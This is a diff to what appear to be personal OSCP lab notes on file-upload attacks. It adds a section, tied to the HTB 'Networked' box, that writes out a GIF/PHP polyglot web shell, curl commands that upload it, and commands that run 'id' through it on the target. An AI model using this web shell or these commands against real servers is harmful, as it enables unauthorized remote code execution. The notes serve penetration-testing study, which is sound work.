@@ -125,6 +125,26 @@ cat web-all-content-types.txt | grep 'image/' | xclip -se c   # paste into Intru
 ```
 Set the Intruder position around `image/jpeg` in the Content-Type header. Responses that say "File successfully uploaded" (not "Only images are allowed") are accepted types.
 
+## Source-disclosed PHP upload with a predictable client-IP filename
+
+If a backup archive exposes the upload handler, preserve its exact multipart field, extension check, MIME check, and stored-name transformation. A common failure is accepting a valid image prefix followed by PHP while checking only the final extension.
+
+```bash
+printf '%s' 'GIF89a<?php system($_GET["cmd"]); ?>' > "$BoxDir/loot/polyglot.php.jpg"
+curl -sS -i -X POST "http://$BoxIP/upload.php" \
+  -F "myFile=@$BoxDir/loot/polyglot.php.jpg;filename=polyglot.php.jpg" \
+  -F 'submit=go!'
+```
+
+If the handler converts dots in the client address to underscores and appends `.php.jpg`, calculate the path rather than guessing:
+
+```bash
+boxset Path "uploads/$(printf '%s' "$LocalIP" | tr . _).php.jpg"
+curl -sS -G --data-urlencode 'cmd=id' "http://$BoxIP/$Path"
+```
+
+Confirm the web account with `id` before sending a callback. See [[OSCP/BOXES/WRITE UPS/Linux/Networked|HTB Networked]].
+
 ## SVG XXE — File Read and PHP Source Disclosure
 
 When the app only accepts SVG images, inject XXE to read server files:
@@ -309,3 +329,4 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- image/PHP polyglot and source-disclosed upload path
